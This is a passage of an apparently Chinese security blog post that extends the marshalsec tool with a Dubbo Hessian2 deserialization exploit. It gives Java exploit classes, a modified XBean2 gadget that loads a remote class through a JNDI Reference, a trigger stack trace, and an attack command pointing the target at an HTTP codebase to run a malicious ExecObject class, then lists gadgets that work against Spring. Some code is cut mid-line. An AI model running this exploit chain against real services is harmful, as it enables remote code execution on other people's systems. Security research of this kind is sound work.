        /**
         * @param bos
         * @return
         */
        protected abstract AbstractHessianOutput createOutput ( ByteArrayOutputStream bos );
        protected abstract AbstractHessianInput createInput ( ByteArrayInputStream bos );
        public static class NoWriteReplaceSerializerFactory extends SerializerFactory {
            /**
             * {@inheritDoc}
             *
             * @see SerializerFactory#getObjectSerializer(Class)
             */
            @Override
            public Serializer getObjectSerializer ( Class cl ) throws HessianProtocolException {
                return super.getObjectSerializer(cl);
            }
            /**
             * {@inheritDoc}
             *
             * @see SerializerFactory#getSerializer(Class)
             */
            @Override
            public Serializer getSerializer ( Class cl ) throws HessianProtocolException {
                Serializer serializer = super.getSerializer(cl);
                if ( serializer instanceof WriteReplaceSerializer ) {
                    return UnsafeSerializer.create(cl);
                }
                return serializer;
            }
        }
    }
#### Hessian2
因为Hessian中的两个流创建方法，返回的流对象都是hessian相关的，而不是hessian2的，因此，我们这里新添加一个类Hessian2，实现HessianBase2，用于重写输出输入流创建方法，用于创建hessian2流对象
    public class Hessian2 extends HessianBase2 {
        /**
         * {@inheritDoc}
         *
         * @see marshalsec.AbstractHessianBase#createOutput(ByteArrayOutputStream)
         */
        @Override
        protected AbstractHessianOutput createOutput ( ByteArrayOutputStream bos ) {
            return new Hessian2Output(bos);
        }
        /**
         * {@inheritDoc}
         *
         * @see marshalsec.AbstractHessianBase#createInput(ByteArrayInputStream)
         */
        @Override
        protected AbstractHessianInput createInput ( ByteArrayInputStream bos ) {
            return new Hessian2Input(bos);
        }
        public static void main ( String[] args ) {
            new Hessian2().run(args);
        }
    }
#### DubboHessian
在根目录加入dubbo-hessian2的exploit入口类
    public class DubboHessian extends Hessian2 {
      private String host;
      private int port;
      public DubboHessian(String[] args) {
        int argoff = 0;
        while (argoff hessian2 payload测试
最后，在加入了dubbo-hessian2的exploit骨架之后，先对我们加入的XBean gadget进行测试
#### 1\. 启动dubbo服务demo
启动一个dubbo协议，端口为20881的dubbo服务，此处我使用的是dubbo-2.6.3进行测试
##### maven依赖
        4.3.5.RELEASE
      org.springframework
      spring-aop
      ${spring.version}
      org.springframework
      spring-core
      ${spring.version}
      org.springframework
      spring-context
      ${spring.version}
      org.springframework
      spring-beans
      ${spring.version}
      com.alibaba
      dubbo
      2.6.3
          commons-logging
          commons-logging
          spring
          org.springframework
          spring-context
          org.springframework
      org.apache.zookeeper
      zookeeper
      3.4.13
      org.apache.curator
      curator-recipes
      4.2.0
          zookeeper
          org.apache.zookeeper
      org.apache.xbean
      xbean-naming
      4.15
##### service
    public interface DemoService {
      String hello();
    }
    public class DemoServiceImpl implements DemoService {
      public String hello() {
        return "hello!";
      }
    }
##### xml配置
       -->
##### main
    public class Main {
      public static void main(String[] args) {
        new ClassPathXmlApplicationContext("dubbo-provider.xml");
        while (true);
      }
    }
#### 2\. 打包marshalsec并执行
在执行marshalsec前，我们得先打包一个恶意class（不需要package名），ExecObject.class放到本地80端口的web资源服务器
前面第一章我们就讲述了如何使用maven打包，接着，我们执行jar包，对dubbo服务进行攻击
    java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.DubboHessian --attack 127.0.0.1 20881 XBean http://127.0.0.1:80/ ExecObject
执行后发现...预期的计算器没弹出来，在经过排查后发现，是因为XBean用到的Spring
AOP的触发类HotSwappableTargetSource在反序列化时抛异常了，具体原因是构造方法选择以及实例化的时候，参数传入了非基本类型，因此变成了null，导致在HotSwappableTargetSource构造方法的断言处抛异常了！
#### 3\. 修改XBean
前面说了，因为XBean用到的Spring
AOP的触发类HotSwappableTargetSource在反序列化时抛异常了，所以，我们是不是可以换一个触发类？
答案是可以的，去掉HotSwappableTargetSource，利用服务端找不到service时抛远程异常，导致异常输出时，执行了gadget的toString方法，从而触发，触发栈：
    getObject:204, ContextUtil$ReadOnlyBinding (org.apache.xbean.naming.context)
    toString:192, Binding (javax.naming)
    valueOf:2994, String (java.lang)
    append:131, StringBuilder (java.lang)
    toString:557, AbstractMap (java.util)
    valueOf:2994, String (java.lang)
    toString:4571, Arrays (java.util)
    toString:209, RpcInvocation (com.alibaba.dubbo.rpc)
    valueOf:2994, String (java.lang)
    append:131, StringBuilder (java.lang)
    getInvoker:213, DubboProtocol (com.alibaba.dubbo.rpc.protocol.dubbo)
    reply:79, DubboProtocol$1 (com.alibaba.dubbo.rpc.protocol.dubbo)
    received:114, DubboProtocol$1 (com.alibaba.dubbo.rpc.protocol.dubbo)
    received:175, HeaderExchangeHandler (com.alibaba.dubbo.remoting.exchange.support.header)
    received:51, DecodeHandler (com.alibaba.dubbo.remoting.transport)
    run:57, ChannelEventRunnable (com.alibaba.dubbo.remoting.transport.dispatcher)
    runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
    run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:745, Thread (java.lang)
这是一个新的触发点，大家挖gadget可以往这个方向去看！
修改后的XBean2：
    public interface XBean2 extends Gadget {
        @Args ( minArgs = 2, args = {
            "codebase", "classname"
        }, defaultArgs = {
            MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
        } )
        default Object makeXBean(UtilFactory uf, String[] args) throws Exception {
            Context ctx = Reflections.createWithoutConstructor(WritableContext.class);
            Reference ref = new Reference("foo", args[ 1 ], args[ 0 ]);
            ReadOnlyBinding binding = new ReadOnlyBinding("foo", ref, ctx);
            return uf.makeToStringTriggerStable(binding); // $NON-NLS-1$
        }
    }
接着修改HessianBase2的实现类为XBean2：
    public abstract class HessianBase2 extends MarshallerBase
            implements XBean2 {
                //...
    }
#### 4\. attack结果
如图所示：  
经过测试发现：
  1. 暂时测试Spring、Spring-boot环境可打的有 Rome, Resin
  2. 能打Spring环境的有SpringAbstractBeanFactoryPointcutAdvisor, Rome, XBean2, Resin
* * *
### 参考
dubbo源码浅析-默认反序列化利用之hessian2：
* * *
### PS
Spring环境，应该有版本限制，但是版本符合范围内，用SpringAbstractBeanFactoryPointcutAdvisor这个gadget打非常好用，最好利用的一个gadget。
最近发现一种dubbo的新打法，不过有点条件限制，但是一点都不鸡肋。文章应该会写，但是短时间内不会发出去了，用来CTF出题岂不更妙哉？